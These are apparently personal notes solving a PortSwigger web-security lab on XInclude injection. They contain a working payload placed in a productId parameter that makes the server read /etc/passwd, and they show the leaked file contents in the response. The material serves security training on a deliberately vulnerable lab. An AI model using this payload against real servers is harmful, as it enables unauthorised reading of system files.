
# Lab: Exploiting XInclude to retrieve files
# https://portswigger.net/web-security/xxe/lab-xinclude-attack
```bash
# Send stock request to repeater
# This time we don't see xml so send this as a request.
# %26 is url encoded version of &
productId=%26entity&storeId=1

# Response: "Entities are not allowed for security reasons"

# This shows that application parsing this as xml
```

```bash

productId=<aa xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></aa>&storeId=1



# Response:
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

# We solved the lab!
```
